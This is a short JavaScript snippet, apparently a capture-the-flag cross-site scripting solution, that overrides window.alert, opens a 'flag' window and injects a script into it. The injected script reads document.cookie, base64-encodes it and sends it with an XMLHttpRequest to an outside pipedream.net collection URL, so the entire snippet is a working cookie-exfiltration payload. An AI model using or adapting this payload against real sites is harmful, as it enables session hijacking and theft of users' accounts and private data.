window.alert = function() {console.log("alert(1337)")};
flag = window.open("flag", "_blank")
flag.window.document.onload = () =>{
    flag.window.document.write('<script>var xhttp = new XMLHttpRequest();xhttp.open("Get","https://eoctl0knzoys9l9.m.pipedream.net/?flag="+btoa(window.document.cookie));xhttp.send()</script>')    
}
